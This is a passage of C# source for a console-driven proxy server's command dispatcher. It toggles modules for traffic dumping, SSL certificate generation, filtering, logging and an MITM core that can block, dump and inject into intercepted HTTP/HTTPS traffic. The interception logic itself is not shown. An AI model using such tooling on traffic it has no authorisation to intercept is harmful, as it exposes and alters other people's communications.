                        logger.Log("Failed to retrieve array ID", VLogger.LogLevel.error);
                        return;
                    }

                    DumpMod.RemoveFile(id);
                }
                else if (command == "list")
                {
                    DumpMod.ListDumpers();
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetPrompt(DumpMod.pRestore);
                    DumpMod.pRestore = "";
                    DumpMod.selfInteractive = false;
                    console.Clear();
                    console.SetInteractiveGroup("ig.null");
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, DumpMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, DumpMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.mitm");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(DumpMod);
                }
                else
                {
                    logger.Log("Invalid Dump Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.ssl")
            {
                if (command.StartsWith("set file_path "))
                {
                    string path = command.Substring(14);
                    bool result = CertMod.SetFile(path);
                    if (result) logger.Log("File path set to " + path, VLogger.LogLevel.information);
                    else logger.Log("File path not found", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("generate "))
                {
                    string sub = command.Substring(9);
                    String[] options = sub.Split(' ');
                    bool result = false;
                    if (options.Length == 1) result = CertMod.GenerateCertificate(options[0]);
                    else if (options.Length == 2) result = CertMod.GenerateCertificate(options[0], options[1]);
                    else if (options.Length == 3) result = CertMod.GenerateCertificate(options[0], options[1], int.Parse(options[2]));
                    else
                    {
                        logger.Log("Wrong number of arguments", VLogger.LogLevel.error);
                        return;
                    }

                    if (!result)
                    {
                        logger.Log("Cert Generation failed!\r\nmakecert.exe might doesn't exist!", VLogger.LogLevel.error);
                    }
                }
                else if (command == "test")
                {
                    if (CertMod.GetCert() == null) logger.Log("Certification parse failed!\r\nTry regenerating the certificate and check the file path", VLogger.LogLevel.error);
                    else logger.Log("Certification is parsed correctly", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set protocols "))
                {
                    string opt = command.Substring(14);
                    if (opt == "")
                    {
                        logger.Log("No protocols specified!", VLogger.LogLevel.error);
                        return;
                    }

                    VSslCertification.SslProtObj[] prots = VSslCertification.StringToProtocols(opt);
                    if (prots.Length == 1 && prots[0].sslProt == SslProtocols.None)
                    {
                        logger.Log("No valid protocol was specified!", VLogger.LogLevel.error);
                    }
                    else
                    {
                        CertMod.SetProtocols(prots);
                        logger.Log("Protocols set!", VLogger.LogLevel.information);
                    }
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetPrompt(CertMod.pRestore);
                    CertMod.pRestore = null;
                    CertMod.selfInteractive = false;
                    console.SetInteractiveGroup("ig.null");
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, CertMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, CertMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.mitm");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(CertMod);
                }
                else
                {
                    logger.Log("Invalid Cert Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.mitm")
            {
                if (command == "create_filters")
                {
                    mitmHttp.CreateFilters();
                }
                else if (command == "list_all")
                {
                    mitmHttp.ListServices();
                }
                else if (command == "check_filters")
                {
                    String[] errors = mitmHttp.CheckBlockers();
                    string output = "";
                    int i = 1;
                    foreach (String e in errors)
                    {
                        output += "[" + i.ToString() + "] " + e + Environment.NewLine;
                        i++;
                    }

                    if (output == "") logger.Log("Filters are correctly working!", VLogger.LogLevel.information);
                    else logger.Log(output, VLogger.LogLevel.error);
                }
                else if (command == "check_dumpers")
                {
                    String[] errors = mitmHttp.CheckDumpers();
                    string output = "";
                    int i = 1;
                    foreach (String e in errors)
                    {
                        output += "[" + i.ToString() + "] " + e + Environment.NewLine;
                        i++;
                    }

                    if (output == "") logger.Log("Dumpers are correctly working!", VLogger.LogLevel.information);
                    else logger.Log(output, VLogger.LogLevel.error);
                }
                else if (command == "create_dumpers")
                {
                    mitmHttp.CreateDumps();
                }
                else if (command == "create_injects")
                {
                    mitmHttp.CreateInjects();
                }
                else if (mitmHttp.IsSetServiceCommand(command))
                {
                    string[] args = command.Split(' ');
                    if (args.Length != 2)
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                        return;
                    }
                    string srv = args[0];
                    string opt = args[1];
                    bool ch = S2b(opt, false);
                    if (srv.Contains("block"))
                    {
                        VMitm.BlockServices bs = mitmHttp.StringToBService(srv);
                        mitmHttp.SetServiceState(bs, ch);
                    }
                    else if (srv.Contains("dump"))
                    {
                        VMitm.DumpServices ds = mitmHttp.StringToDService(srv);
                        mitmHttp.SetServiceState(ds, ch);
                    }
                    else if (srv.Contains("inject"))
                    {
                        VMitm.InjectServices iS = mitmHttp.StringToIService(srv);
                        mitmHttp.SetServiceState(iS, ch);
                    }
                }
                else if (command.StartsWith("check_service "))
                {
                    string opt = command.Substring(14);
                    if (opt == "")
                    {
                        logger.Log("No parameters specified!", VLogger.LogLevel.error);
                        return;
                    }
                    bool sstate = false;
                    if (opt.Contains("block"))
                    {
                        VMitm.BlockServices bs = mitmHttp.StringToBService(opt);
                        sstate = mitmHttp.CheckServiceState(bs);
                    }
                    else if (opt.Contains("dump"))
                    {
                        VMitm.DumpServices ds = mitmHttp.StringToDService(opt);
                        sstate = mitmHttp.CheckServiceState(ds);
                    }
                    else if (opt.Contains("inject"))
                    {
                        VMitm.InjectServices iS = mitmHttp.StringToIService(opt);
                        sstate = mitmHttp.CheckServiceState(iS);
                    }

                    logger.Log("MITM" + opt.Substring(4) + " is set to " + ((sstate) ? "Enabled" : "Disabled"), VLogger.LogLevel.information);
                }
                else if (command.StartsWith("list_service "))
                {
                    string opt = command.Substring(13);
                    if (opt == "")
                    {
                        logger.Log("No parameters specified!", VLogger.LogLevel.error);
                        return;
                    }

                    mitmHttp.ListAll(opt);
                }
                else if (command.StartsWith("inject_manager "))
                {
                    string opt = command.Substring(15);
                    bool ch = S2b(opt, false);

                    if (ch)
                    {
                        mitmHttp.SetServiceState(VMitm.InjectServices.Core, true);
                        logger.Log("Service MITM_inject_core started", VLogger.LogLevel.service);
                    }
                    else
                    {
                        mitmHttp.SetServiceState(VMitm.InjectServices.Core, false);
                        logger.Log("Service MITM_inject_core stopped", VLogger.LogLevel.service);
                    }
                }
                else if (command.StartsWith("inject_manager"))
                {
                    if (!mitmHttp.CheckServiceState(VMitm.InjectServices.Core))
                    {
                        logger.Log("MITM_inject_core is not started!", VLogger.LogLevel.warning);
                        return;
                    }
                    console.Clear();
                    mitmHttp.pRestore = console.GetPrompt();
                    console.SetPrompt("/proxyServer/MITM/inject_manager>");
                    console.SetInteractiveGroup("ig.inject");
                    mitmHttp.selfInteractive = true;
                }
                else if (command == "cls")
                {
                    console.Clear();
                }
                else if (command == "exit")
                {
                    string p = mitmHttp.pRestore;
                    console.SetPrompt(p);
                    console.SetInteractiveGroup("ig.null");
                    mitmHttp.pRestore = "";
                    mitmHttp.selfInteractive = false;
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, mitmHttp);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, mitmHttp);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.mitm");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(mitmHttp);
                }
                else
                {
                    logger.Log("Invalid MITM_Core Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.vfman")
            {
                if (command.StartsWith("add "))
                {
                    string name = command.Substring(4);
                    if (name.Contains(" "))
                    {
                        logger.Log("Filter names can'r contain spaces!\r\n Use dash \"-\" instead.", VLogger.LogLevel.error);
                        return;
                    }
                    bool result = vf.CreateFilter(name);
                    if (result)
                    {
                        logger.Log("Filter added to filter list!", VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("A filter with that name already exists!", VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("del "))
                {
                    string name = command.Substring(4);
                    bool result = vf.DestroyFilter(name);
                    if (result)
                    {
                        logger.Log("Filter removed from filter list!", VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("Filter don't exists!", VLogger.LogLevel.error);
                    }
                }
                else if (command == "clear")
                {
                    vf.ResetAllFilter();
                    logger.Log("Reset completed!", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("setup "))
                {
                    command = command.Substring(6);
                    String[] opt = command.Split(' ');
                    string fName = opt[0];
                    string fOp = opt[1];
                    string firstPart = fName + " " + fOp + " ";
                    string value = command.Replace(firstPart, String.Empty);
                    VFilter.Operation operation = S2op(fOp);
                    if (operation == VFilter.Operation.Undefined)
                    {
                        logger.Log("The operation you specified is not valid!", VLogger.LogLevel.error);
                        return;
                    }

                    bool result = vf.Addfilter(fName, operation, value);

                    if (result)
                    {
                        logger.Log("Filter added to " + fName, VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("Failed to add filter to " + fName, VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("remove "))
                {
                    command = command.Substring(7);
                    String[] opt = command.Split(' ');
                    string fName = opt[0];
                    string fOp = opt[1];
                    string firstPart = fName + " " + fOp + " ";
                    string value = command.Replace(firstPart, String.Empty);
                    VFilter.Operation operation = S2op(fOp);
                    if (operation == VFilter.Operation.Undefined)
                    {
                        logger.Log("The operation you specified is not valid!", VLogger.LogLevel.error);
                        return;
                    }

                    bool result = vf.RemoveFilter(fName, operation, value);

                    if (result)
                    {
                        logger.Log("Filter removed frome " + fName, VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("Failed to remove filter from " + fName, VLogger.LogLevel.error);
                    }
                }
                else if (command == "list")
                {
                    vf.PrintFilter();
                }
                else if (command.StartsWith("show "))
                {
                    string opt = command.Substring(5);
                    vf.PrintRules(opt);
                }
                else if (command == "cls")
                {
                    console.Clear();
                }
                else if (command == "exit")
                {
                    string prompt = vf.pRestore;
                    vf.pRestore = "";
                    console.SetPrompt(prompt);
                    console.SetInteractiveGroup("ig.null");
                    vf.selfInteractive = false;
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, vf);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, vf);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.vfman");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(vf);
                }
                else
                {
                    logger.Log("Invalid Filter manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.logger")
            {
                if (command.StartsWith("set file_logger "))
                {
                    string opt = command.Substring(16);
                    bool ch = S2b(opt, false);
                    if (ch)
                    {
                        logger.printToFile = true;
                        logger.Log("Logger.FileLogging.State started", VLogger.LogLevel.service);
                    }
                    else
                    {
                        logger.printToFile = false;
                        logger.Log("Logger.FileLogging.State disabled", VLogger.LogLevel.service);
                    }
                }
                else if (command.StartsWith("bind "))
                {
                    command = command.Substring(5);
                    String[] parts = command.Split(' ');
                    if (parts.Length != 2)
                    {
                        logger.Log("Wrong number of arguments!\r\nbind [filter_name] [target_bind]", VLogger.LogLevel.error);
                        return;
                    }

                    VLogger.LogLevel option = VLogger.StringToLogLevel(parts[1]);
                    string filterName = parts[0];

                    if (option == VLogger.LogLevel.unknown)
                    {
                        logger.Log("Wrong target_bind parameter valid parameters are: request, response, information, error, service, warning", VLogger.LogLevel.error);
                        return;
                    }

                    logger.BindFilter(filterName, option);
                    logger.Log("Filter bind completed!", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("unbind "))
                {
                    string filterName = command.Substring(7);

                    logger.UnBindFilter(filterName);
                    logger.Log("Filter unbind completed!", VLogger.LogLevel.information);
                }
                else if (command == "bind_list")
                {
                    logger.BindList();
                }
                else if (command.StartsWith("set file_path "))
                {
                    string path = command.Substring(14);
                    logger.SetFile(path);
                    logger.Log("Logger.FileLogging.Path set to " + path, VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set output_data "))
                {
                    string opts = command.Substring(16);
                    string[] optList = opts.Split(' ');
                    bool err = false;
                    bool war = false;
                    bool req = false;
                    bool resp = false;
                    bool srv = false;

                    foreach (string logOption in optList)
                    {
                        if (logOption == "error") err = true;
                        if (logOption == "warning") war = true;
                        if (logOption == "request") req = true;
                        if (logOption == "response") resp = true;
                        if (logOption == "service") srv = true;
                        if (logOption == "*" || logOption == "all")
                        {
                            err = true;
                            war = true;
                            srv = true;
                            req = true;
                            resp = true;
                        }
                    }

                    logger.SetupLogLevel(err, war, srv, req, resp);
                    logger.Log("Logger.Global.LogLevelOutput changed!", VLogger.LogLevel.information);
                }
                else if (command == "exit")
                {
                    string prompt = logger.pRestore;
                    logger.pRestore = "";
                    console.SetPrompt(prompt);
                    console.SetInteractiveGroup("ig.null");
                    logger.selfInteractive = false;
                    console.Clear();
                }
                else if (command == "cls")
                {
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, LogMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, LogMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.logger");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(LogMod);
                }
                else
                {
                    logger.Log("Invalid Logger Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (pinManager.isSet && pinManager.isEnable)
            {
                if (!pinManager.CheckPin(command)) return;
            }

            if (command.StartsWith("set ip "))
            {
                ip = command.Substring(7);
                if (IpVerification(ip))
                    logger.Log("IP Address set to: " + ip, VLogger.LogLevel.information);
                else
                {
                    ip = "";
                    logger.Log("Invalid IP Address Specified", VLogger.LogLevel.error);
                }
            }
            else if (command.StartsWith("set port "))
            {
                string input = command.Substring(9);
                if (IsInteger(input))
                {
                    port = int.Parse(input);
                    if (PortVerification(port))
                        logger.Log("Port set to: " + port.ToString(), VLogger.LogLevel.information);
                    else
                    {
                        port = 0;
                        logger.Log("Invalid Port Number", VLogger.LogLevel.error);
                    }
                }
            }
            else if (command.StartsWith("set pending_limit "))
            {
                string input = command.Substring(18);

                if (IsInteger(input))
                {
                    pendingConnectionLimit = int.Parse(input);
                    if (pendingConnectionLimit > 0) logger.Log("Pending Connection Limit set to: " + pendingConnectionLimit.ToString(), VLogger.LogLevel.information);
                    else logger.Log("Number has to be at least 1!", VLogger.LogLevel.error);
                }
            }
            else if (command == "cls")
            {
                console.Clear();
            }
            else if (command == "exit")
            {
                Thread t = new Thread(new ThreadStart(Exit));
                t.Start();
            }
            else if (command == "start")
            {
                if (server == null)
                {
                    server = new ProxyServer(ip, port, pendingConnectionLimit, console, this);
                }
                else if (!isStarted && server != null)
                {
                    server.Setup(ip, port, pendingConnectionLimit);
                }

                if (server == null)
                {
                    server.SetMode(ProxyServer.Mode.forward, "http");
                    server.SetMode(ProxyServer.Mode.forward, "https");
                }

                server.StartServer();
                logger.Log("Server Started", VLogger.LogLevel.information);
                isStarted = true;
            }
            else if (command.StartsWith("set font_size "))
            {
                string input = command.Substring(14);

                if (IsFloat(input))
                {
                    float size = float.Parse(input);
                    console.SetTextSize(size);
                    logger.Log("Textsize set to: " + size.ToString(), VLogger.LogLevel.information);
                }
            }
            else if (command.StartsWith("auto_allow "))
            {
                if (!isStarted)
                {
                    ServerNotStarted();
                    return;
                }
                string opt = command.Substring(11);
                bool ch = S2b(opt, true);
                server.autoAllow = ch;
                if (ch) logger.Log("AutoAllow Active", VLogger.LogLevel.service);
                else logger.Log("AutoAllow diabled", VLogger.LogLevel.service);
            }
            else if (command.StartsWith("set pin "))
            {
                if (!pinManager.isEnable)
                {
                    ServiceNotStarted();
                    return;
                }
                string pin = command.Substring(8);

                if (IsInteger(pin))
                {
                    pinManager.SetPin(pin);
                }
            }
            else if (command.StartsWith("pin_manager "))
            {
                string opt = command.Substring(12);
                bool ch = S2b(opt, true);
                pinManager.isEnable = ch;
                if (ch) logger.Log("PinManager Active", VLogger.LogLevel.service);
                else logger.Log("PinManager diabled", VLogger.LogLevel.service);
            }
            else if (command.StartsWith("stop"))
            {
                server.StopServer();
                server.Dispose();
                server = null;
                isStarted = false;
            }
            else if (command == "list")
            {
                if (!isStarted)
                {
                    ServerNotStarted();
                    return;
                }

                server.ListClients();
            }
            else if (command.StartsWith("kick "))
            {
                if (!isStarted)
                {
                    ServerNotStarted();
                    return;
                }

                int id = int.Parse(command.Substring(5));
                server.Kick(id);
            }
            else if (command.StartsWith("save "))
            {
                string filename = command.Substring(5);
                if (server == null)
                {
                    server = new ProxyServer(ip, port, pendingConnectionLimit, console, this);
                }
                SetMod.SetupObjects(this, console, pinManager, server, vf, RegMod, logger, DumpMod, CertMod, mitmHttp, InjectMod);
                SetMod.Save(filename);
            }
            else if (command.StartsWith("load "))
            {
                string filename = command.Substring(5);
                SetMod.FindFile(filename);
                CreateServer();
                SetMod.SetupObjects(this, console, pinManager, server, vf, RegMod, logger, DumpMod, CertMod, mitmHttp, InjectMod);
                SetMod.Load();
            }
            else if (command == "clean_client")
            {
                if (server != null)
                {
                    string prompt = console.GetPrompt();
                    console.SetPrompt("[Y/N]");
                    bool result = console.ChoicePrompt("[Y/N] Do you really want to disconnect all clients?");
                    if (result)
                    {
                        server.CleanSockets();
                    }

                    console.SetPrompt(prompt);
                }
            }
            else if (command.StartsWith("logger "))
            {
                string opt = command.Substring(7);
                bool ch = S2b(opt, false);
                if (ch)
                {
                    logger.Log("Logger Enabled", VLogger.LogLevel.service);
                    logger.started = true;
                }
                else
                {
                    logger.Log("Logger Disabled", VLogger.LogLevel.service);
                    logger.started = false;
                }
            }
            else if (command == "logger")
            {
                if (!logger.started)
                {
                    logger.Log("Logger service is not started\r\nCannot enter interactive mode!", VLogger.LogLevel.warning);
                    return;
                }
                console.SetInteractiveGroup("ig.logger");
                console.Clear();
                logger.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/logger>");
                logger.selfInteractive = true;
            }
            else if (command.StartsWith("filter_manager "))
            {
                string opt = command.Substring(15);
                bool ch = S2b(opt, true);

                if (ch)
                {
                    vf.started = true;
                    logger.Log("Filter Manager started!", VLogger.LogLevel.service);
                }
                else
                {
                    vf.started = false;
                    logger.Log("Filter Manager stopped!", VLogger.LogLevel.service);
                }
            }
            else if (command == "filter_manager")
            {
                if (!vf.started)
                {
                    logger.Log("Service filter manager is not started!", VLogger.LogLevel.warning);
                    return;
                }

                console.SetInteractiveGroup("ig.vfman");
                console.Clear();
                vf.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/filter_manager>");
                vf.selfInteractive = true;
            }
            else if (command.StartsWith("mitm "))
            {
                string opt = command.Substring(5);
                bool ch = S2b(opt, false);
                if (ch)
                {
                    logger.Log("MITM_core is Started", VLogger.LogLevel.service);
                    mitmHttp.started = true;
                }
                else
                {
                    logger.Log("MITM_core is disabled", VLogger.LogLevel.service);
                    mitmHttp.started = false;
                }
            }
            else if (command == "mitm")
            {
                if (!mitmHttp.started)
                {
                    logger.Log("MITM_core is not started!", VLogger.LogLevel.warning);
                    return;
                }
                mitmHttp.pRestore = console.GetPrompt();
                console.SetInteractiveGroup("ig.mitm");
                mitmHttp.selfInteractive = true;
                console.Clear();
                console.SetPrompt("/proxyServer/MITM>");
            }
            else if (command.StartsWith("sslcert_manager "))
            {
                string opt = command.Substring(16);
                bool ch = S2b(opt, false);
                if (ch)
                {
                    logger.Log("SSL Certification Manager started", VLogger.LogLevel.service);
                    CertMod.started = true;
                }
                else
                {
                    logger.Log("SSL Certification Manager disabled", VLogger.LogLevel.service);
                    CertMod.started = false;
                }
            }
            else if (command == "sslcert_manager")
            {
                if (!CertMod.started)
                {
                    CertMod.WarningMessage();
                    return;
                }
                CertMod.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/certManager>");
                console.SetInteractiveGroup("ig.ssl");
                CertMod.selfInteractive = true;
                console.Clear();
            }
            else if (command.StartsWith("set mode "))
            {
                string opt = command.Substring(9);
                if (!opt.Contains(" "))
                {
                    logger.Log("No parameters specified", VLogger.LogLevel.error);
                    return;
                } // opt check
                String[] opts = opt.Split(' ');
                if (opts.Length != 2)
                {
                    logger.Log("Invalid number of parameters", VLogger.LogLevel.error);
                    return;
                } // opt count check
                ProxyServer.Mode pMode = ProxyServer.StringToMode(opts[1]);
                string prot = opts[0].ToLower();
                if (isStarted && pMode != ProxyServer.Mode.Undefined)
                {
                    if (prot == "http" || prot == "https") server.SetMode(pMode, prot);
                    logger.Log(prot.ToUpper() + " mode set to " + opts[1].ToUpper(), VLogger.LogLevel.information);
                }
                else if (isStarted && pMode == ProxyServer.Mode.Undefined) logger.Log("One or all of the parameters are invalid!", VLogger.LogLevel.error);
                else logger.Log("Server Not Started!", VLogger.LogLevel.error);
            }
            else if (command == "list_modes")
            {
                if (server != null) server.PrintModes();
                else logger.Log("Server not available!", VLogger.LogLevel.error);
            }
            else if (command.StartsWith("dump_manager "))
            {
                string opt = command.Substring(13);
                bool ch = S2b(opt, false);
                if (ch)
                {
                    logger.Log("Dump manager started!", VLogger.LogLevel.service);
                    DumpMod.started = true;
                }
                else
                {
                    logger.Log("Dump manager disabled!", VLogger.LogLevel.service);
                    DumpMod.started = false;
                }
            }
            else if (command == "dump_manager")
            {
                if (!DumpMod.started)
                {
                    DumpMod.WarningMessage();
                    return;
                }

                DumpMod.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/dumpManager>");
                DumpMod.selfInteractive = true;
                console.Clear();
                console.SetInteractiveGroup("ig.dump");
            }
            else if (command.StartsWith("regex_manager "))
            {
                string opt = command.Substring(14);
                bool ch = S2b(opt, false);
                if (ch)
                {
                    logger.Log("Regular Expression Manager Started", VLogger.LogLevel.service);
                    RegMod.started = true;
                }
                else
                {
                    logger.Log("Regular Expression Manager Stopped", VLogger.LogLevel.service);
                    RegMod.started = false;
                }
            }
            else if (command == "regex_manager")
            {
                if (!RegMod.started)
                {
                    RegMod.WarningMessage();
                    return;
                }

                RegMod.selfInteractive = true;
                RegMod.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/regex_manager>");
                console.SetInteractiveGroup("ig.regex");
                console.Clear();
            }
            else if (command.StartsWith("help "))
            {
                string rest = command.Substring(5);
                if (rest.StartsWith("int "))
                {
                    string path = rest.Substring(4);
                    HelpMod.RunInteractiveHelp(path);
                    if (!HelpMod.GetCommandUpdates)
                    {
                        logger.Log("No such interactive help modul\r\nType help int -to list available interactive help modules", VLogger.LogLevel.error);
                        return;
                    }
                }
                else if (rest == "int")
                {
                    HelpMod.ListInteractive();
                }
                else if (rest.StartsWith("param "))
                {
                    string p = rest.Substring(6);
                    HelpMod.GetHelp(p, VHelp.Type.ParameterList);
                }
                else if (rest == "param")
                {
                    console.WriteLine("Type help param [parameter] -to get help on a parameter listed by a help of a command");
                }
                else
                {
                    HelpMod.GetHelp(command, VHelp.Type.Command);
                }
            }
            else if (command == "help")
            {
                HelpMod.ListAll(this);
            }
            else
            {
                logger.Log("Invalid Command!", VLogger.LogLevel.error);
            }

            if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

            //feature: auto clean implemented, but disabled
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            FinalExit();
        }
    }

    struct CommandObj
    {
        public string command;
        public VConsole console;
        public VPin pinManager;
    }

    #region Interfaces 

    interface IFilter
    {
        Dictionary<string, object> filterName { get; set; }
        VFilter manager { get; set; }
        bool BindFilter(string filterName, object value);
        bool UnBindFilter(string filterName);
        bool SearchFilter(string sMethod, object sparam, string input);
        void BindList();
        void SetManager(VFilter manager);
        string PushBindInfo();
        void PullBindInfo(string bInfo);

    }

    interface IService
    {
        bool started { get; set; }
        bool selfInteractive { get; set; }
        string pRestore { get; set; }
        void WarningMessage();
    }

    interface ISettings
    {
        void LoadSettings(KeyValuePair<string, string> k);
        void WriteSettings(System.Xml.XmlWriter xml);
    }

    interface IRegEx
    {
        Dictionary<string, object> RegExName { get; set; }
        VRegEx Rxmanager { get; set; }
        bool BindRegEx(string filterName, object value);
        bool UnBindRegEx(string filterName);
        bool MatchRegex(string sMethod, object parameter, string input);
        void BindListR();
        void SetManager(VRegEx manager);
        string PushRBindInfo();
        void PullRBindInfo(string bInfo);
    }

    interface IHelp
    {
        string HelpFile { get; set; }
    }

    #endregion

    #region Classes

    public class VHelp : IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                Array.Clear(services, 0, services.Length);
                services = null;
                iGuide.Clear();
                iGuide = null;
                exp.Clear();
                exp = null;
                currentHelp = null;
                ctx = null;
                console = null;
            }

            disposed = true;
        }

        object[] services;
        Dictionary<string, InteractiveHelp> iGuide = new Dictionary<string, InteractiveHelp>();
        List<string> exp = new List<string>();
        public bool GetCommandUpdates = false;
        private string currentHelp = "";
        private int currentHelpIndex = 0;
        private Form1 ctx;
        private VConsole console;
        
        public enum Type
        {
            ParameterList,
            Command,
        }

        public enum InteractiveLevel
        {
            Normal,
            Listing,
            EasyToComplete
        }

        public struct InteractiveHelp
        {
            public List<string> messages;
            public List<int> idle;
            public List<Func<bool>> triggerNext;
            public InteractiveLevel level;
        }

        public VHelp(Form1 context, VConsole con)
        {
            ctx = context;
            console = con;
        }

        /// <summary>
        /// List all commands belonging to a specified object
        /// </summary>
        /// <param name="input">Object, that can be converted to an IHelp object</param>

        public void ListAll(object input)
        {
            IHelp ihObject = (IHelp)input;
            if (!File.Exists(ihObject.HelpFile)) return;

            using (System.Xml.XmlReader xml = System.Xml.XmlReader.Create(ihObject.HelpFile))
            {
                while (xml.Read())
                {
                    if (xml.IsEmptyElement) continue;

                    if (xml.IsStartElement())
                    {
                        string element = xml.Name;
                        if (element.StartsWith("cmd_"))
                        {
                            string command = element.Substring(4);
                            command = command.Replace(".", " ");
                            xml.Read();
                            string exp = xml.Value;
                            console.Write(command + " - " + exp + "\r\n");
                        }
                    }
                }
            }

            console.WriteLine("For more detailed help type: help [command_name], to read the required parameters!");
        }

        /// <summary>
        /// Load the services into the local service list
        /// </summary>
        /// <param name="service">The service object itself</param>

        public void RegisterServices(params object[] service)
        {
            services = service;
        }

        /// <summary>
        /// Run the help mode based on the command on the needed service
        /// </summary>
        /// <param name="command">The current command</param>
        /// <param name="helpType">The type of the help to run</param>
        /// <param name="overloadAuto">Overload the automatic IHelp object</param>

        public void GetHelp(string command, Type helpType, object overloadAuto = null)
        {
            IHelp help;
            if (overloadAuto == null) help = GetHelperClass(command);
            else help = (IHelp) overloadAuto;
            if (help == null) return;

            if (command.StartsWith("help ")) command = command.Substring(5);

            using (System.Xml.XmlReader r = System.Xml.XmlReader.Create(help.HelpFile))
            {
                int cmdNumber = 1;

                while (r.Read())
                {
                    if (r.IsEmptyElement) continue;
                    
                    if (r.IsStartElement())
                    {
                        string eName = r.Name;
                        if (eName == "help" || eName == "commands") continue;
                        if (eName.StartsWith("cmd_") && helpType == Type.Command)
                        {
                            string cmd = r.Name.Substring(4);
                            cmd = cmd.Replace(".", " ");
                            string chk = cmd.ToLower();
                            if (!command.ToLower().StartsWith(chk)) continue;
                            string explenation = "";
                            string[] parameters;
                            parameters = r.GetAttribute("params").Split(',');
                            r.Read();
                            explenation = r.Value;
                            if (cmdNumber == 1) console.Write("\r\n");
                            console.Write(cmdNumber.ToString() + ": " + cmd + " ");
                            int index = 0;
                            foreach (string p in parameters)
                            {
                                if (p == "") continue;
                                console.Write("[" + p + "]");
                                if (index < parameters.Length) console.Write(" ");
                                index++;
                            }

                            console.Write("\r\n" + explenation + "\r\n");
                            cmdNumber++;
                        }

                        if (eName.StartsWith("p_") && helpType == Type.ParameterList)
                        {
                            string pName = eName.Substring(2);
